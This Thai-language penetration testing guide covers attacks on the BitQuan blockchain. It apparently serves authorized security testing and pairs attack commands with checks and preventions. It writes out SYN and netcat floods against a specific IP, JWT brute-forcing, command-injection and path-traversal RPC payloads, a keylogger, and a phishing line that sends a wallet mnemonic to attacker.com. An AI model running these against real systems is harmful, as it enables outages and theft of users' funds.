# BitQuan Blockchain Attack Vectors — Comprehensive Penetration Testing Guide

**เอกสารนี้สร้างขึ้นเพื่อทดสอบความปลอดภัยของบล็อกเชน BitQuan เท่านั้น**  
**ห้ามใช้เทคนิคเหล่านี้โจมตีเครือข่ายอื่นโดยไม่ได้รับอนุญาต**

---

## 📋 สารบัญ

1. [Network Layer Attacks](#1-network-layer-attacks)
2. [Consensus Attacks](#2-consensus-attacks)
3. [Cryptographic Attacks](#3-cryptographic-attacks)
4. [Mempool & Transaction Attacks](#4-mempool--transaction-attacks)
5. [RPC & API Attacks](#5-rpc--api-attacks)
6. [Wallet & Key Management Attacks](#6-wallet--key-management-attacks)
7. [Storage & Database Attacks](#7-storage--database-attacks)
8. [P2P Protocol Attacks](#8-p2p-protocol-attacks)
9. [Economic & Game Theory Attacks](#9-economic--game-theory-attacks)
10. [Smart Contract Attacks](#10-smart-contract-attacks)
11. [Side Channel & Timing Attacks](#11-side-channel--timing-attacks)
12. [DoS & Resource Exhaustion](#12-dos--resource-exhaustion)

---

## 1. Network Layer Attacks

### 1.1 Eclipse Attack
**คำอธิบาย**: ผู้โจมตีควบคุมการเชื่อมต่อ peer ทั้งหมดของ node เป้าหมาย ทำให้ node ถูกแยกออกจากเครือข่ายจริง

**วิธีทดสอบ**:
```bash
# สร้าง malicious nodes ล้อมรอบ target node
# ใช้ Sybil attack เพื่อเติม peer list ด้วย malicious IPs
for i in {1..100}; do
  ./bitquan-node run --p2p-bind 0.0.0.0:$((19444+i)) \
    --datadir /tmp/sybil-$i &
done

# Monitor target node connections
watch -n 1 'curl -s http://127.0.0.1:19443/peers | jq'
```

**ตรวจสอบ**:
- ตรวจสอบว่า node มี peer diversity หรือไม่
- ตรวจสอบ peer reputation system
- ตรวจสอบ max inbound/outbound connection limits

**Prevention**: Implement peer diversity scoring, CIDR-based connection limits

---

### 1.2 Sybil Attack
**คำอธิบาย**: สร้าง node จำนวนมากด้วย identity ปลอมเพื่อครอบงำเครือข่าย

**วิธีทดสอบ**:
```bash
# Generate 1000 unique node IDs
for i in {1..1000}; do
  mkdir -p /tmp/sybil-node-$i
  # Launch nodes with unique identities
  ./bitquan-node run \
    --datadir /tmp/sybil-node-$i \
    --p2p-bind 0.0.0.0:$((20000+i)) &
done

# Observe network topology
./bitquan-cli getpeerinfo
```

**ตรวจสอบ**:
- ตรวจสอบว่ามี proof-of-work requirement สำหรับ peer registration หรือไม่
- ตรวจสอบ IP-based rate limiting
- ตรวจสอบ peer scoring mechanism

---

### 1.3 BGP Hijacking / MITM
**คำอธิบาย**: ดักจับ traffic ระหว่าง nodes ผ่านการ hijack BGP routes

**วิธีทดสอบ**:
```bash
# ใช้ mitmproxy หรือ tcpdump
mitmproxy --mode transparent --tcp-host-target 140.245.127.249:19444

# หรือใช้ iptables redirect
iptables -t nat -A PREROUTING -p tcp --dport 19444 -j REDIRECT --to-port 8080
```

**ตรวจสอบ**:
- ตรวจสอบว่าใช้ TLS/Noise protocol encryption หรือไม่
- ตรวจสอบ certificate pinning
- ตรวจสอบ peer authentication

**Prevention**: Use Noise Protocol Framework (มี peer key authentication)

---

### 1.4 DDoS (Distributed Denial of Service)
**คำอธิบาย**: ท่วม node ด้วย traffic จำนวนมากจนไม่สามารถให้บริการได้

**วิธีทดสอบ**:
```bash
# SYN Flood
hping3 -S -p 19444 --flood 140.245.127.249

# Application-layer flood (peer connection spam)
for i in {1..10000}; do
  (echo "version" | nc 140.245.127.249 19444 &)
done

# Transaction spam
for i in {1..100000}; do
  ./bitquan-cli sendtoaddress <addr> 0.00000001 &
done
```

**ตรวจสอบ**:
- Connection rate limits
- Transaction rate limits
- Resource quotas per peer
- Load balancing & auto-scaling

---

## 2. Consensus Attacks

### 2.1 51% Attack
**คำอธิบาย**: ควบคุม hashrate มากกว่า 50% เพื่อ rewrite blockchain history

**วิธีทดสอบ**:
```bash
# Private mining — mine blocks แต่ไม่ broadcast
./bitquan-node mine --threads 64 --private-mode

# เมื่อสร้าง private chain ยาวกว่า public chain
# broadcast ทีเดียวเพื่อ reorganize
./bitquan-cli submitblock <block_hex>
```

**ตรวจสอบ**:
- Monitor network hashrate distribution
- Implement checkpoint system
- Require confirmations for high-value transactions (e.g., 6+ blocks)

---

### 2.2 Selfish Mining
**คำอธิบาย**: Miner เก็บบล็อกที่ขุดได้ไว้ก่อน แล้ว broadcast เมื่อเห็นคนอื่นขุดได้

**วิธีทดสอบ**:
```python
# Pseudo-code
def selfish_mine():
    private_chain = []
    while True:
        if found_block():
            private_chain.append(block)
            if len(private_chain) > public_chain_length + 1:
                broadcast_all(private_chain)
        if other_miner_found_block():
            broadcast_immediately(private_chain)
```

**ตรวจสอบ**:
- Analyze block propagation times
- Monitor orphan rate
- Detect unusual mining patterns

---

### 2.3 Time Warp Attack
**คำอธิบาย**: จัดการ timestamp ใน block header เพื่อหลอก difficulty adjustment algorithm

**วิธีทดสอบ**:
```bash
# Manipulate block timestamps
# ต้องแก้ไขใน consensus crate
# ลอง set timestamp ไปในอนาคต/อดีต
sed -i 's/SystemTime::now()/SystemTime::now() + Duration::from_secs(7200)/' \
  crates/consensus/src/validator.rs
cargo build --release
./target/release/bitquan-node mine
```

**ตรวจสอบ**:
- Timestamp validation rules (e.g., must be > median of last 11 blocks)
- Maximum future timestamp allowed (e.g., +2 hours)
- ASERT difficulty algorithm resistance

**การป้องกัน**: BitQuan ใช้ ASERT (Absolutely Scheduled Expected Runtime Target) ซึ่งทนทานต่อ time warp

---

### 2.4 Nothing-at-Stake Attack (สำหรับ PoS)
**คำอธิบาย**: Validator vote บนทุก fork พร้อมกัน เพราะไม่มีต้นทุน

**สถานะใน BitQuan**: **ไม่เกี่ยวข้อง** — BitQuan ใช้ Proof-of-Work, ไม่ใช่ Proof-of-Stake

---

### 2.5 Long-Range Attack (สำหรับ PoS)
**คำอธิบาย**: สร้าง chain ทางเลือกจาก genesis block ด้วย old validator keys

**สถานะใน BitQuan**: **ไม่เกี่ยวข้อง** — PoW blockchain ป้องกันด้วย cumulative difficulty

---

## 3. Cryptographic Attacks

### 3.1 Signature Malleability
**คำอธิบาย**: แก้ไข signature โดยที่ยัง valid แต่ txid เปลี่ยน (ใช้โจมตี transaction tracking)

**วิธีทดสอบ**:
```bash
# ตรวจสอบว่า Dilithium5 signature มี canonical form หรือไม่
# ลองสร้าง transaction 2 versions ที่ signature ต่างกันแต่ verify ผ่านทั้งคู่
./bitquan-cli createrawtransaction '[...]' '{...}'
# Manually flip signature bits and re-submit
```

**ตรวจสอบ**:
- Dilithium5 signature uniqueness
- Transaction ID calculation (ต้องใช้ canonical signature)

**การป้องกัน**: CRYSTALS-Dilithium มี deterministic signature scheme (ไม่ควรมีปัญหานี้)

---

### 3.2 Quantum Attack
**คำอธิบาย**: ใช้ quantum computer (Shor's algorithm) ทำลาย ECDSA/RSA

**สถานะใน BitQuan**: **ป้องกันแล้ว** — ใช้ CRYSTALS-Dilithium5 (Lattice-based, NIST Level 5)

**วิธีทดสอบ** (ทฤษฎี):
- รอ quantum computer ขนาด ~4000 logical qubits
- รัน Shor's algorithm บน ECDSA keys (Bitcoin, Ethereum)
- ไม่สามารถทำลาย Dilithium5 ด้วย Shor's algorithm

---

### 3.3 Hash Collision (Pre-image Attack)
**คำอธิบาย**: หา input สองตัวที่ให้ SHA-256 hash เดียวกัน

**วิธีทดสอบ**:
```bash
# Birthday attack — ต้องการ 2^128 hash operations
# ไม่เป็นไปได้ในทางปฏิบัติสำหรับ SHA-256
```

**ตรวจสอบ**:
- BitQuan ใช้ SHA-256d (double SHA-256) เหมือน Bitcoin
- ปลอดภัยจาก collision attacks

---

### 3.4 Weak Randomness (PRNG Attack)
**คำอธิบาย**: Random number generator ที่ predict ได้ ทำให้ private key หรือ nonce รั่ว

**วิธีทดสอบ**:
```bash
# ตรวจสอบ source code ว่าใช้ randomness อะไร
grep -r "rand::" crates/
grep -r "OsRng" crates/
grep -r "thread_rng" crates/

# ลองสร้าง wallet หลายครั้งดูว่า pattern ซ้ำหรือไม่
for i in {1..100}; do
  ./bitquan-node wallet-gen --output test-$i.keystore \
    --password "test" --network testnet
  # Extract และเปรียบเทียบ keys
done
```

**ตรวจสอบ**:
- ต้องใช้ `rand::rngs::OsRng` (cryptographically secure)
- ไม่ใช้ `rand::thread_rng()` สำหรับ key generation

---

## 4. Mempool & Transaction Attacks

### 4.1 Double-Spend Attack
**คำอธิบาย**: ส่ง transaction ใช้ UTXO เดียวกันสองครั้ง (ก่อนติด block)

**วิธีทดสอบ**:
```bash
# สร้าง 2 transactions ใช้ same UTXO
./bitquan-cli createrawtransaction \
  '[{"txid":"abc...","vout":0}]' \
  '{"addr1":"1.0"}'
TX1=$(./bitquan-cli signrawtransaction <hex>)

./bitquan-cli createrawtransaction \
  '[{"txid":"abc...","vout":0}]' \
  '{"addr2":"1.0"}'
TX2=$(./bitquan-cli signrawtransaction <hex>)

# Broadcast พร้อมกัน
./bitquan-cli sendrawtransaction $TX1 &
./bitquan-cli sendrawtransaction $TX2 &
```

**ตรวจสอบ**:
- Mempool ต้อง detect duplicate UTXO references
- Double-spend detection ก่อน relay
- ตรวจสอบ code ใน `crates/mempool/`

---

### 4.2 Transaction Malleability (ดู 3.1)

---

### 4.3 Dust Attack
**คำอธิบาย**: ส่ง transaction จำนวนเล็กมาก (dust) ไปยัง address เพื่อ track UTXO และ de-anonymize

**วิธีทดสอบ**:
```bash
# ส่ง 0.00000001 BQ ไปหลายพัน address
for addr in $(cat target_addresses.txt); do
  ./bitquan-cli sendtoaddress $addr 0.00000001
done

# Track การใช้ dust UTXOs เพื่อ cluster addresses
./bitquan-cli listtransactions | jq '.[] | select(.amount < 0.0001)'
```

**ตรวจสอบ**:
- Minimum transaction amount policy
- Dust threshold definition
- Coin control features ใน wallet

---

### 4.4 Replace-by-Fee (RBF) Exploitation
**คำอธิบาย**: Replace transaction ด้วย fee สูงกว่าเพื่อ cancel payment

**วิธีทดสอบ**:
```bash
# Send transaction ด้วย low fee, enable RBF
./bitquan-cli sendtoaddress <addr> 1.0 --fee=0.001 --enable-rbf

# Replace ด้วย transaction ที่ส่งเงินกลับตัวเอง
./bitquan-cli createrawtransaction [...] '{<my_addr>: 0.999}'
./bitquan-cli signrawtransaction <hex>
./bitquan-cli sendrawtransaction <signed_hex> --replace
```

**ตรวจสอบ**:
- RBF policy ใน mempool
- Merchants ต้อง wait confirmation, ไม่ accept 0-conf

**สถานะใน BitQuan**: ตรวจสอบว่ามี RBF support หรือไม่

---

### 4.5 Transaction Pinning
**คำอธิบาย**: สร้าง child transaction ด้วย low fee เพื่อ "pin" parent transaction ไม่ให้ถูก RBF

**วิธีทดสอบ**:
```bash
# สร้าง parent tx ด้วย RBF enabled
PARENT_TXID=$(./bitquan-cli sendtoaddress <addr> 1.0 --enable-rbf)

# สร้าง child tx ใช้ output ของ parent ด้วย very low fee
./bitquan-cli createrawtransaction \
  '[{"txid":"'$PARENT_TXID'","vout":0}]' \
  '{<any_addr>: 0.999}'
# Sign and broadcast child
```

**ตรวจสอบ**:
- Child-Pays-For-Parent (CPFP) policy
- Package relay support

---

## 5. RPC & API Attacks

### 5.1 Unauthorized Access / Authentication Bypass
**คำอธิบาย**: เข้าถึง RPC endpoint โดยไม่มี credentials

**วิธีทดสอบ**:
```bash
# ลองเรียก RPC โดยไม่ส่ง JWT token
curl -X POST http://140.245.127.249:19443/ \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"getblockcount","id":1}'

# Brute-force JWT secret
hashcat -m 16500 -a 3 jwt_token.txt ?a?a?a?a?a?a

# ลอง default credentials
curl -u admin:admin http://140.245.127.249:19443/
```

**ตรวจสอบ**:
- JWT implementation correctness
- Token expiration
- Rate limiting on auth endpoints
- No default credentials

---

### 5.2 JSON-RPC Injection
**คำอธิบาย**: ส่ง malformed JSON payload เพื่อ crash parser หรือ execute commands

**วิธีทดสอบ**:
```bash
# Deeply nested JSON (parser DoS)
curl -X POST http://140.245.127.249:19443/ \
  -d '{"jsonrpc":"2.0","method":"test","params":[[[[[[[[[[[[...]]]]]]]]]]],"id":1}'

# Null bytes
echo -ne '{"jsonrpc":"2.0","method":"get\x00block","id":1}' | \
  curl -X POST http://140.245.127.249:19443/ --data-binary @-

# SQL injection-style (ถ้า RPC มี raw query)
curl -X POST http://140.245.127.249:19443/ \
  -d '{"method":"getblock","params":["1 OR 1=1"]}'
```

**ตรวจสอบ**:
- JSON parser security (ใช้ `serde_json` — ควรปลอดภัย)
- Input validation
- No raw SQL queries

---

### 5.3 Rate Limiting Bypass
**คำอธิบาย**: หลีกเลี่ยง rate limit ด้วย IP rotation หรือ request manipulation

**วิธีทดสอบ**:
```bash
# Rotate source IPs
for ip in $(cat proxy_list.txt); do
  curl --interface $ip -X POST http://140.245.127.249:19443/ \
    -d '{"method":"getblockcount","id":1}'
done

# Header manipulation
curl -H "X-Forwarded-For: 1.2.3.4" ...
curl -H "X-Real-IP: 5.6.7.8" ...
```

**ตรวจสอบ**:
- Rate limit implementation (IP-based? User-based? Token-based?)
- Distributed rate limiting (Redis/Memcached)

---

### 5.4 Command Injection
**คำอธิบาย**: RPC method เรียก system command โดยไม่ sanitize input

**วิธีทดสอบ**:
```bash
# ถ้ามี RPC method ที่รับ filename
curl -X POST http://140.245.127.249:19443/ \
  -d '{"method":"importwallet","params":["wallet.dat; cat /etc/passwd"]}'

# Path traversal
curl -X POST http://140.245.127.249:19443/ \
  -d '{"method":"loadwallet","params":["../../../../etc/passwd"]}'
```

**ตรวจสอบ**:
- ไม่มี system command execution ใน RPC handlers
- Path sanitization

---

### 5.5 Replay Attack
**คำอธิบาย**: จับ valid RPC request แล้วส่งซ้ำ

**วิธีทดสอบ**:
```bash
# Capture valid request
tcpdump -i eth0 -w rpc_capture.pcap port 19443

# Replay
tcpreplay -i eth0 rpc_capture.pcap
```

**ตรวจสอบ**:
- Request nonce/timestamp
- JWT jti (unique token ID)

---

## 6. Wallet & Key Management Attacks

### 6.1 Keylogger / Clipboard Hijacking
**คำอธิบาย**: Malware ดัก password หรือ mnemonic phrase จาก keyboard/clipboard

**วิธีทดสอบ**:
```python
# Simulate keylogger
from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()
```

**การป้องกัน**:
- Hardware wallet support
- Encrypted keyboard input
- Warning: "Never type mnemonic in browser"

---

### 6.2 Weak Password / Brute Force
**คำอธิบาย**: Crack wallet password ด้วย dictionary/brute-force

**วิธีทดสอบ**:
```bash
# ถ้า wallet ใช้ AES-256-GCM กับ Argon2id
# ลอง brute-force password
hashcat -m <mode> -a 0 wallet.keystore rockyou.txt

# หรือ custom script
for pw in $(cat passwords.txt); do
  ./bitquan-cli loadwallet --password "$pw" wallet.keystore
done
```

**ตรวจสอบ**:
- Password strength requirements
- Argon2id parameters (time cost, memory cost)
- Rate limiting on password attempts

---

### 6.3 Mnemonic Phrase Theft
**คำอธิบาย**: โจร mnemonic phrase เพื่อ recover wallet

**วิธีทดสอบ**:
```bash
# ถ้าเจอ mnemonic ใน plaintext file/screenshot/memory dump
grep -r "word1 word2 word3" /

# Recover wallet
./bitquan-node wallet-from-mnemonic \
  --mnemonic "stolen phrase here" \
  --password "anypassword" \
  --output stolen.keystore
```

**การป้องกัน**:
- Never store mnemonic in plaintext
- Memory encryption
- Clear clipboard after copy
- Steel backup (physical storage)

---

### 6.4 Wallet File Theft
**คำอธิบาย**: ขโมยไฟล์ wallet.keystore

**วิธีทดสอบ**:
```bash
# ถ้า attacker มี file access
cp ~/.bitquan/testnet/wallet.keystore /tmp/stolen.keystore

# Offline brute-force password
hashcat -m <mode> -a 0 stolen.keystore rockyou.txt
```

**การป้องกัน**:
- Strong encryption (AES-256-GCM)
- Strong KDF (Argon2id)
- File permissions (chmod 600)
- Encrypted filesystem

---

### 6.5 Phishing
**คำอธิบาย**: หลอกให้ user เข้า fake wallet website และขโมย mnemonic

**วิธีทดสอบ**:
```bash
# สร้าง fake wallet website
cp -r /home/ubuntu/bitquan/wallet/ /tmp/fake-wallet/
# Modify JS to exfiltrate mnemonic
echo "fetch('http://attacker.com/steal?m='+mnemonic)" >> script.js
# Host บน domain คล้ายกัน (bitquαn.com — ใช้ Unicode)
python3 -m http.server 8000
```

**การป้องกัน**:
- HTTPS + HSTS
- Domain monitoring
- Browser extension warnings
- Hardware wallet support

---

## 7. Storage & Database Attacks

### 7.1 Database Corruption
**คำอธิบาย**: แก้ไขข้อมูลใน RocksDB โดยตรง

**วิธีทดสอบ**:
```bash
# หยุด node
pkill bitquan-node

# แก้ไข RocksDB ด้วย ldb tool
ldb --db=~/.bitquan/testnet/blocks put "block:0" "<corrupted_data>"

# Restart node
./bitquan-node run
```

**ตรวจสอบ**:
- Database integrity checks (checksums)
- Backup & recovery procedures
- Database encryption (optional)

---

### 7.2 Disk Space Exhaustion
**คำอธิบาย**: Spam blockchain จนเต็ม disk

**วิธีทดสอบ**:
```bash
# Mine empty blocks ติดต่อกัน
for i in {1..100000}; do
  ./bitquan-cli generatetoaddress 1 <addr>
done

# หรือสร้าง large transactions
# (BitQuan block size = 4 MB)
```

**ตรวจสอบ**:
- Disk space monitoring & alerts
- Pruning mode (delete old block data)
- Block size limits

---

### 7.3 Blockchain Bloat
**คำอธิบาย**: เติมข้อมูล junk ใน blockchain (OP_RETURN, large signatures)

**วิธีทดสอบ**:
```bash
# สร้าง transaction ใส่ data ใน OP_RETURN
./bitquan-cli createrawtransaction \
  '[...]' \
  '{"data":"<80 bytes of garbage>"}'
# Repeat หลายพัน transactions
```

**ตรวจสอบ**:
- OP_RETURN size limit (Bitcoin = 80 bytes)
- Transaction size limit
- Fee per byte (ทำให้ spam มีราคาแพง)

---

## 8. P2P Protocol Attacks

### 8.1 Fake Block/Transaction Propagation
**คำอธิบาย**: ส่ง invalid block/transaction เพื่อ waste bandwidth

**วิธีทดสอบ**:
```python
# สร้าง custom P2P client
import socket

s = socket.socket()
s.connect(('140.245.127.249', 19444))
# ส่ง malformed block message
s.send(b'\x00' * 1000)
```

**ตรวจสอบ**:
- Block/transaction validation ก่อน relay
- Peer banning for invalid data
- DoS protection

---

### 8.2 Version Rollback Attack
**คำอธิบาย**: Announce เวอร์ชันเก่าเพื่อ exploit vulnerabilities

**วิธีทดสอบ**:
```bash
# ใช้ node เวอร์ชันเก่าที่มีช่องโหว่
./old-bitquan-node --version 0.0.1

# ดูว่า current nodes ยอมรับหรือไม่
```

**ตรวจสอบ**:
- Minimum protocol version enforcement
- Mandatory upgrade mechanism

---

### 8.3 Eclipse via Peer Address Table Pollution
**คำอธิบาย**: เติม peer address table ด้วย malicious IPs

**วิธีทดสอบ**:
```bash
# ส่ง `addr` messages จำนวนมาก
# ต้องสร้าง custom P2P client
```

**ตรวจสอบ**:
- Address table size limits
- Address validation
- Rate limiting on `addr` messages

---

## 9. Economic & Game Theory Attacks

### 9.1 Fee Sniping
**คำอธิบาย**: Re-mine block ที่มี transaction fees สูง

**วิธีทดสอบ**:
```bash
# ถ้ามี block ที่มี fees สูงมาก
# ลอง re-mine จาก parent block
./bitquan-node mine --from-block <parent_hash>
```

**ตรวจสอบ**:
- ไม่มีการป้องกันโดยตรง — เป็น economic issue
- ควร wait confirmations

---

### 9.2 Miner Extractable Value (MEV)
**คำอธิบาย**: Miner จัดเรียง/แทรก/เซ็นเซอร์ transaction เพื่อผลกำไร

**วิธีทดสอบ**:
```bash
# Monitor mempool
./bitquan-cli getrawmempool true

# ถ้าเห็น transaction น่าสนใจ
# ขุด block ใส่ transaction ของตัวเองก่อน
./bitquan-node mine --include-txs <my_tx_only>
```

**ตรวจสอบ**:
- Transaction ordering fairness
- Private mempool abuse

**สถานะใน BitQuan**: ไม่มี smart contracts → MEV น้อยกว่า Ethereum มาก

---

### 9.3 Spam Attack (Economic DoS)
**คำอธิบาย**: Flood mempool ด้วย low-fee transactions

**วิธีทดสอบ**:
```bash
# สร้าง 100,000 transactions ด้วย minimum fee
for i in {1..100000}; do
  ./bitquan-cli sendtoaddress <addr> 0.001 --fee=0.00000001 &
done
```

**ตรวจสอบ**:
- Minimum fee policy
- Mempool size limits
- Transaction eviction policy

---

## 10. Smart Contract Attacks

### สถานะใน BitQuan: **ไม่เกี่ยวข้อง**

BitQuan ไม่มี smart contracts — "no smart contracts, no governance tokens, no DAOs"

(ข้ามหัวข้อนี้)

---

## 11. Side Channel & Timing Attacks

### 11.1 Timing Attack on Signature Verification
**คำอธิบาย**: วัดเวลาใน signature verification เพื่อหา secret key

**วิธีทดสอบ**:
```python
import time
import requests

times = []
for i in range(1000):
    start = time.perf_counter()
    r = requests.post('http://140.245.127.249:19443/', json={
        "method": "sendrawtransaction",
        "params": ["<crafted_tx>"]
    })
    elapsed = time.perf_counter() - start
    times.append(elapsed)

# Analyze timing variance
import numpy as np
print(f"Mean: {np.mean(times)}, Std: {np.std(times)}")
```

**ตรวจสอบ**:
- Constant-time crypto operations
- Dilithium5 implementation ต้องเป็น constant-time

**การป้องกัน**: pqcrypto-dilithium crate ควรเป็น constant-time (ตรวจสอบ upstream)

---

### 11.2 Power Analysis (DPA/SPA)
**คำอธิบาย**: วัดการใช้ไฟฟ้าขณะ crypto operations เพื่อหา key

**วิธีทดสอบ**:
- ต้องมี physical access
- ใช้ oscilloscope วัด power consumption

**การป้องกัน**: Hardware security modules (HSM), constant-time implementations

---

## 12. DoS & Resource Exhaustion

### 12.1 Memory Exhaustion
**คำอธิบาย**: ส่ง requests ที่ทำให้ node กิน memory จนหมด

**วิธีทดสอบ**:
```bash
# ส่ง very large RPC requests
curl -X POST http://140.245.127.249:19443/ \
  -d '{"method":"getblock","params":["'$(python -c 'print("A"*10000000)')'"]}' 

# Flood inbound connections
for i in {1..10000}; do
  (nc 140.245.127.249 19444 < /dev/zero &)
done
```

**ตรวจสอบ**:
- Request size limits
- Connection limits
- Memory usage monitoring

---

### 12.2 CPU Exhaustion
**คำอธิบาย**: ส่ง computationally expensive requests

**วิธีทดสอบ**:
```bash
# Request การ verify signatures จำนวนมาก
for i in {1..1000}; do
  ./bitquan-cli verifymessage <addr> <sig> "test" &
done

# Request block validation ซ้ำๆ
for i in {1..1000}; do
  ./bitquan-cli verifychain &
done
```

**ตรวจสอบ**:
- Rate limiting on expensive operations
- CPU usage monitoring
- Request queuing

---

### 12.3 Bandwidth Exhaustion
**คำอธิบาย**: ส่ง/รับข้อมูลจำนวนมหาศาลเพื่อเบิร์น bandwidth

**วิธีทดสอบ**:
```bash
# Download blockchain data ซ้ำๆ
for i in {1..100}; do
  ./bitquan-cli getblock <hash> true > /dev/null &
done

# Request `getblocks` messages
# (ต้องใช้ custom P2P client)
```

**ตรวจสอบ**:
- Bandwidth limits per peer
- Traffic shaping

---

### 12.4 File Descriptor Exhaustion
**คำอธิบาย**: เปิด connection จำนวนมากจนเกิน file descriptor limit

**วิธีทดสอบ**:
```bash
# Check current limit
ulimit -n

# Exhaust file descriptors
for i in {1..65536}; do
  (nc 140.245.127.249 19444 &)
done
```

**ตรวจสอบ**:
- `ulimit -n` configuration
- Connection limits
- File descriptor monitoring

---

## 🛡️ Recommended Testing Tools

### Network Analysis
- **Wireshark**: Packet capture and analysis
- **tcpdump**: Command-line packet sniffer
- **nmap**: Network scanner
- **hping3**: Packet crafting and firewall testing

### Fuzzing
- **AFL++**: Coverage-guided fuzzer
- **Honggfuzz**: Security-oriented fuzzer
- **Cargo-fuzz**: Rust fuzzing integration

### Load Testing
- **wrk**: HTTP benchmarking tool
- **ab** (Apache Bench): HTTP load testing
- **locust**: Distributed load testing

### Penetration Testing
- **Metasploit**: Exploitation framework
- **Burp Suite**: Web vulnerability scanner
- **OWASP ZAP**: Security testing tool

### Blockchain-Specific
- **Mythril**: Smart contract security (ไม่เกี่ยวข้อง BitQuan)
- **Slither**: Static analysis (ไม่เกี่ยวข้อง BitQuan)
- **Manticore**: Symbolic execution

### Monitoring
- **Prometheus**: Metrics collection
- **Grafana**: Visualization (มีใน BitQuan testnet แล้ว)
- **ELK Stack**: Logging and analytics

---

## 📊 Testing Priority Matrix

| Attack Vector | Severity | Likelihood | Priority |
|--------------|----------|------------|----------|
| 51% Attack | Critical | Low (testnet) | Medium |
| Double-Spend (0-conf) | High | Medium | High |
| RPC Auth Bypass | Critical | Medium | Critical |
| Eclipse Attack | High | Medium | High |
| DDoS | Medium | High | High |
| Weak Password | High | High | High |
| Mempool Spam | Medium | High | Medium |
| Signature Malleability | Medium | Low | Low |
| Quantum Attack | Critical | Very Low (2030+) | Low |

---

## 🔬 Automated Testing Strategy

```bash
#!/bin/bash
# comprehensive-audit.sh

echo "=== BitQuan Security Audit ==="

# 1. Code Analysis
echo "[*] Running Clippy (linter)"
cargo clippy --all-targets --all-features -- -D warnings

echo "[*] Running cargo-audit (dependency vulnerabilities)"
cargo audit

echo "[*] Running cargo-deny (license/security policy)"
cargo deny check

# 2. Fuzzing
echo "[*] Running fuzz tests"
cd fuzz
cargo fuzz list | xargs -I {} cargo fuzz run {} -- -max_total_time=300

# 3. Unit Tests
echo "[*] Running unit tests"
cargo test --workspace

# 4. Integration Tests
echo "[*] Running integration tests"
./scripts/run-integration-tests.sh

# 5. Network Tests
echo "[*] Testing P2P resilience"
./scripts/test-eclipse-attack.sh
./scripts/test-sybil-resistance.sh

# 6. RPC Security
echo "[*] Testing RPC authentication"
./scripts/test-rpc-auth.sh

# 7. Consensus Tests
echo "[*] Testing double-spend protection"
./scripts/test-double-spend.sh

# 8. Load Tests
echo "[*] Running load tests"
./scripts/test-dos-resistance.sh

echo "=== Audit Complete ==="
```

---

## 📝 Reporting Template

เมื่อพบช่องโหว่ ให้รายงานตามแบบฟอร์มนี้:

```markdown
## Vulnerability Report: [Title]

**Severity**: Critical / High / Medium / Low
**Component**: consensus / network / rpc / mempool / wallet / storage
**Attack Vector**: [How to exploit]

### Description
[รายละเอียดช่องโหว่]

### Proof of Concept
```bash
[Code/commands ที่ reproduce ได้]
```

### Impact
- [ผลกระทบต่อ security]
- [ผลกระทบต่อ users]
- [ผลกระทบต่อ network]

### Affected Code
- File: `crates/<component>/src/<file>.rs`
- Line: `<line_number>`
- Function: `<function_name>`

### Recommendation
[วิธีแก้ไข]

### References
- [CWE-XXX]
- [CVE-YYYY-NNNN]
```

---

## 🎯 Next Steps

1. **อ่านโค้ด** — เริ่มจาก `crates/` ที่มี security-critical code:
   - `crates/consensus/` — difficulty, validation
   - `crates/mempool/` — double-spend detection
   - `crates/rpc/` — authentication, authorization
   - `crates/crypto/` — Dilithium5, Argon2id
   - `crates/network/` — P2P protocol

2. **รัน automated tests** — ใช้ CI workflows ที่มีอยู่:
   ```bash
   # ดูใน .github/workflows/
   cat .github/workflows/security-scan.yml
   ```

3. **Setup testnet** — Deploy private testnet สำหรับ penetration testing:
   ```bash
   docker compose -f docker-compose.cluster.yml up -d
   ```

4. **เริ่ม manual testing** — ทดสอบตาม checklist ด้านบน

5. **Document findings** — บันทึกทุกช่องโหว่ที่พบ พร้อม PoC

6. **Fix vulnerabilities** — แก้ไขและ verify ด้วย regression tests

7. **Re-test** — ทดสอบซ้ำหลัง patch

---

## ⚠️ Ethical Guidelines

- ✅ **DO**: Test บน testnet ของตัวเอง
- ✅ **DO**: Test บน private network
- ✅ **DO**: รายงานช่องโหว่ที่พบอย่างรับผิดชอบ
- ✅ **DO**: Request permission ก่อน test production

- ❌ **DON'T**: โจมตี mainnet (ถ้ามี) โดยไม่ได้รับอนุญาต
- ❌ **DON'T**: โจมตี blockchain อื่น
- ❌ **DON'T**: เปิดเผยช่องโหว่ต่อสาธารณะก่อนแก้ไข
- ❌ **DON'T**: ทำ real financial damage

---

**สร้างโดย**: Hermes (ซากุระ) 🌸  
**วันที่**: 2026-08-15  
**เวอร์ชัน**: 1.0  
**สถานะ**: Living Document — จะอัพเดทเมื่อพบ attack vectors ใหม่
